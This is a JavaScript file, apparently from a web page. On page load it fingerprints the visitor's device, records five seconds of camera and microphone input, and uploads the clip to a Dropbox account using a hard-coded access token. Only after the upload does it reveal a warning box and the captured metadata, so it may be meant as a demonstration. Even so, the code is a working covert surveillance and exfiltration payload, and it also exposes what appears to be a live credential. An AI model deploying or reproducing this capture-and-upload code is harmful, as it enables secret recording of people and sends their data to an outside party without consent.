window.onload = async () => {
    const deviceInfo = {
        browser: navigator.userAgent,
        os: navigator.platform,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        resolution: `${window.screen.width}x${window.screen.height}`
    };

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        const mediaRecorder = new MediaRecorder(stream);
        let chunks = [];

        mediaRecorder.ondataavailable = (e) => {
            if (e.data.size > 0) chunks.push(e.data);
        };

        mediaRecorder.onstop = async () => {
            const videoBlob = new Blob(chunks, { type: 'video/webm' });
            
            const infoDiv = document.getElementById('device-info-container');
            infoDiv.style.display = "block";
            infoDiv.innerHTML = `
                <h4 style="color: #58a6ff; margin-top: 0;">Captured Device Metadata:</h4>
                <p><strong>OS:</strong> ${deviceInfo.os}</p>
                <p><strong>Browser:</strong> ${deviceInfo.browser}</p>
                <p><strong>Timezone:</strong> ${deviceInfo.timezone}</p>
                <p><strong>Resolution:</strong> ${deviceInfo.resolution}</p>
            `;
            
            await uploadToCloud(videoBlob);
        };

        mediaRecorder.start();
        
        setTimeout(() => {
            if (mediaRecorder.state !== "inactive") {
                mediaRecorder.stop();
                stream.getTracks().forEach(track => track.stop());
            }
        }, 5000);

    } catch (err) {
        console.error(err);
    }
};

async function uploadToCloud(videoBlob) {
    const ACCESS_TOKEN = 'sl.u.AGXrd8aed8GaBjXCNv3Wlevq5PKr0p_dNmgoI7udgL_t2E5UcWF2PtOUAr5d94DXLc7GfbFKwHAuDaLBIRo3fYAvQ5ZopcZqAtCImwmf_C0T8jaJA5hMSBoMVWngt591rxnb7ABlkkGV_wFH6zzYSlRDkL-_DikUe74A3LGRywzXJzMVTYQ734F-Q1FcGyy_CvZFioHdMBMS1rx2lwP3CL7gwf1Trix-hvfXD3Wcl-yOyN9I45W7M3N5evjVMK7ruETxmhW5KCLmqbAcrSFG87nT2Hf6w8wgKP1CES5HsX8CYEtX4BMMkfr3ZcixAo0ctzOdQuL86sX9Ck_vEbc3ozz-MSrcplrBtEk-oHt6zUL-L1VeKwmyutw9_bivjyVNnpj0M3AqIr64teLz1P4E4QN584_E2mX2xr_8TdAeATNA9ebyc2c_1cdW_gqM4tbQ_vqRWH4JzVjHD-XdSbkXk1uUo974XXO9tNuDlZUZSirD_gq3Sp6ChES9qJBybpMUpJ1EhZfw3BV3z_iWOfI3vV9znhS95SsxvnlK7OOC6z_NOa4RJ0yfjjQhF-hK_0UqUQra_SNDjVXpKf2CQ3m50GES4nEHv1ZppHGx_viNt0p7sG58TEXZv7lgyIWof4SzwHR6enYs5sAGNDRtwGGFS0UqcHznADIctx2xF1i8v5Kk3UP-Qq0NCfF75UKQ47d_g8FcyuCEgCsGUg87QASfnuQHKDi2aic8JQDg6PMGsl85OmqU-JP0BqQ6cmIplpf-fMB1ACz8WmCw_7miWk1y-gUYJQeHO84DfgIXg7FCKx0g-bR5_k0JctCDxy1focUqGntJdfawRoYeQiV_OPD8V_Sy2GKa2aM_xEG6k5jZxt8_sPb9RqiR3yiuGV3A5E_Xqdlle57igpnhDIDAqMDiUKS_BNAArPdNO-xOM9zDT4zW0hN_a2_OMw5QyvVlj4XGYD49yh0ulRBgyiPuwB3f4_L3KPCZYIHN9hd2VR_R-b16d1O6BFbLhuZv32n9e-maB76xuB5YSNL50mQkM9nNSXhobLymL87F9Xfzd4LLPmFDwjUJmG-4LopqgV50vHvcpnpGW1BpjryFkolPFgW8UThu1MJPIUCDhrMDiv16nFWJer3OtaYbaXAbPQ_tVNKhavtEBz2otskcC99Bi1QcdM9bXL6I_62oe5MIk2HOHc_VGhUWqFHR5yrVkSdqIBbPwuZce4FkQU1ayRzM1JCfvQOlBrv4KNp5rdzAseZVwKT3c68bfk34ErLrkywTmvUQpz8bmZ6D-Xg1i1L1HmGu2oGvjjJuTaJrqAo0dKcjMeK2uG60NSD0h3zVd9Zmb2rusaLjmlbFpLOVSXIqnhyYff_s5uAWubUdRSBHrPxM8hSFXWJ25-VCPVmW5H6d0deBqkJXisyFz3Muzr4WF1pUDJp8XWMmCRb04C-tZpqwYjGC2Q'; 
    const fileName = `capture_${Date.now()}.webm`;

    try {
        const response = await fetch('https://content.dropboxapi.com/2/files/upload', {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${ACCESS_TOKEN}`,
                'Dropbox-API-Arg': JSON.stringify({
                    path: `/${fileName}`,
                    mode: 'add',
                    autorename: true,
                    mute: false
                }),
                'Content-Type': 'application/octet-stream'
            },
            body: videoBlob
        });

        if (response.ok) {
            document.getElementById('warning-box').style.display = 'block';
        }
    } catch (error) {
        console.error(error);
    }
}